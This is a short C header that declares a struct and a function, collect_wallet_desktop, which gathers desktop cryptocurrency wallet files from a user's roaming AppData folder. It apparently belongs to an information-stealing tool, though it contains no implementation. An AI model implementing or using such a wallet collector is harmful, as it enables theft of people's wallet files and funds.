#ifndef WALLET_DESKTOP_H
#define WALLET_DESKTOP_H

#include <stddef.h>

typedef struct {
    char *name;
    char **files;
    size_t file_count;
    char *path;
} WalletDesktopData;

// Collect desktop wallet files
WalletDesktopData *collect_wallet_desktop(const char *roaming_app_data, size_t *count);

#endif
